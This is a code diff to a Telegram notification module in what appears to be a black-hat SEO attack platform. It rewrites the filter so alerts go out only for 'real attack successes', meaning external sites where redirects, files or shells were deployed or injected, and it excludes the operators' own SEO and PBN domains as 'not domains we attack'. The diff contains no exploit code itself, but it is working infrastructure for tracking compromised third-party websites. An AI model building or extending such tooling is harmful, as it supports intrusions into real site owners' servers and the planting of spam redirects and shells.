@@ -12,6 +12,35 @@
 import { ENV } from "./_core/env";
 import { fetchWithPoolProxy } from "./proxy-pool";
 
+// Dynamic SEO domain cache — refreshed periodically
+let seoDomainsCache: Set<string> = new Set();
+let seoDomainsCacheTime = 0;
+const SEO_CACHE_TTL = 5 * 60 * 1000; // 5 minutes
+
+async function getSeoAutomationDomains(): Promise<Set<string>> {
+  if (Date.now() - seoDomainsCacheTime < SEO_CACHE_TTL && seoDomainsCache.size > 0) {
+    return seoDomainsCache;
+  }
+  try {
+    // Lazy import to avoid circular dependency
+    const { getUserSeoProjects } = await import("./db");
+    const projects = await getUserSeoProjects();
+    const domains = new Set<string>();
+    for (const p of projects) {
+      if (p.domain) {
+        // Normalize domain — strip protocol, www, trailing slash
+        const clean = p.domain.replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/$/, "").toLowerCase();
+        domains.add(clean);
+      }
+    }
+    seoDomainsCache = domains;
+    seoDomainsCacheTime = Date.now();
+    return domains;
+  } catch {
+    return seoDomainsCache; // Return stale cache on error
+  }
+}
+
 // ═══════════════════════════════════════════════════════
 //  TYPES
 // ═══════════════════════════════════════════════════════
@@ -242,44 +271,103 @@ export async function sendTelegramNotification(
     return { success: false, error: "Telegram not configured (missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID)" };
   }
 
-  // ═══ SUCCESS-ONLY FILTER ═══
-  // Only send: "success" type notifications
-  // Also allow: "info" type for critical system updates (learning, CVE, SEO reports, orchestrator)
-  // Block: "failure", "partial", "progress" types entirely
-  if (notification.type === "failure") {
-    console.log(`[Telegram] Skipping failure notification for ${notification.targetUrl} (success-only mode)`);
+  // ═══ STRICT ATTACK-SUCCESS-ONLY FILTER ═══
+  // ONLY send notifications for REAL attack successes where:
+  // 1. Type is "success"
+  // 2. Has deployedUrls with actual URLs (verified redirect/file placement)
+  // 3. Target is NOT an SEO automation domain (our own domains)
+  // Block EVERYTHING else: info, progress, partial, failure, freshness, distribution, CVE, orchestrator, etc.
+  
+  // Block all non-success types immediately
+  if (notification.type !== "success") {
+    console.log(`[Telegram] Blocked ${notification.type} notification for ${notification.targetUrl} (attack-success-only mode)`);
     return { success: true };
   }
-  if (notification.type === "partial") {
-    console.log(`[Telegram] Skipping partial notification for ${notification.targetUrl} (success-only mode)`);
-    return { success: true };
-  }
-  if (notification.type === "progress") {
-    console.log(`[Telegram] Skipping progress notification for ${notification.targetUrl} (success-only mode)`);
-    return { success: true };
-  }
-  // For "info" type: only allow critical system notifications, block error/failure info
-  if (notification.type === "info") {
+
+  // Block success notifications that are NOT real attacks (no deployed URLs = not a real attack)
+  const hasDeployedUrls = notification.deployedUrls && notification.deployedUrls.length > 0;
+  const hasRedirectUrl = !!notification.redirectUrl;
+  
+  // Must have either deployed URLs or redirect URL to prove it's a real attack
+  if (!hasDeployedUrls && !hasRedirectUrl) {
+    // Check if details contain attack-like indicators
     const details = (notification.details || "").toLowerCase();
-    const isErrorInfo = details.includes("failed") || details.includes("error") || details.includes("unhealthy") || details.includes("down:");
-    if (isErrorInfo) {
-      console.log(`[Telegram] Skipping error-info notification for ${notification.targetUrl} (success-only mode)`);
+    const isRealAttack = details.includes("deployed") || details.includes("injected") || details.includes("redirect") || details.includes("shell");
+    if (!isRealAttack) {
+      console.log(`[Telegram] Blocked success notification for ${notification.targetUrl} — no deployed URLs or redirect (not a real attack)`);
       return { success: true };
     }
   }
 
-  let message: string;
+  // Block SEO automation domains (our own domains, not attack targets)
+  // These are domains we manage via SEO Automation, not domains we attack
+  const targetLower = (notification.targetUrl || "").toLowerCase();
+  const detailsLower = (notification.details || "").toLowerCase();
   
-  switch (notification.type) {
-    case "success":
-      message = formatSuccessMessage(notification);
-      break;
-    case "info":
-    default:
-      // Info messages that pass the filter above are system updates (learning, CVE, SEO, etc.)
-      message = formatProgressMessage(notification);
-      break;
+  // Block non-attack notifications disguised as success
+  const NON_ATTACK_KEYWORDS = [
+    "freshness cycle",
+    "multi-platform distribution",
+    "platform discovery",
+    "auto-post",
+    "campaign for",
+    "agentic seo",
+    "ooda cycle",
+    "cve database",
+    "auto-remediation",
+    "proxy",
+    "health check",
+    "pbn expire",
+    "pbn network",
+    "auto-started",
+  ];
+  
+  for (const keyword of NON_ATTACK_KEYWORDS) {
+    if (detailsLower.includes(keyword) || targetLower.includes(keyword)) {
+      console.log(`[Telegram] Blocked non-attack success for ${notification.targetUrl} — matched filter: "${keyword}"`);
+      return { success: true };
+    }
   }
+
+  // Block system/internal targets (not real external attack targets)
+  const SYSTEM_TARGETS = [
+    "orchestrator", "auto-pipeline", "cve database", "pbn network",
+    "proxy-health-check", "system", "agentic session",
+  ];
+  
+  for (const sys of SYSTEM_TARGETS) {
+    if (targetLower.includes(sys)) {
+      console.log(`[Telegram] Blocked system target notification: ${notification.targetUrl}`);
+      return { success: true };
+    }
+  }
+
+  // Dynamic filter: Block notifications for domains in our SEO Automation system
+  // These are OUR domains that we manage, not external attack targets
+  try {
+    const seoDomains = await getSeoAutomationDomains();
+    const cleanTarget = targetLower.replace(/^https?:\/\//, "").replace(/^www\./, "").replace(/\/$/, "");
+    if (seoDomains.has(cleanTarget)) {
+      console.log(`[Telegram] Blocked SEO automation domain: ${notification.targetUrl} (this is our own domain)`);
+      return { success: true };
+    }
+    // Also check partial match (e.g., "tos1688.org" in "https://tos1688.org/path")
+    const seoDomainsArr = Array.from(seoDomains);
+    for (const seoDomain of seoDomainsArr) {
+      if (cleanTarget.includes(seoDomain) || seoDomain.includes(cleanTarget)) {
+        console.log(`[Telegram] Blocked SEO automation domain (partial match): ${notification.targetUrl} ~ ${seoDomain}`);
+        return { success: true };
+      }
+    }
+  } catch {
+    // Non-critical — continue sending if DB check fails
+  }
+
+  // If we get here, it's a real attack success — send it!
+  console.log(`[Telegram] ✅ Sending REAL attack success for ${notification.targetUrl}`);
+
+  // Only success type reaches here (all others are filtered above)
+  const message = formatSuccessMessage(notification);
 
   return sendTelegramMessage(config, message, "HTML");
 }
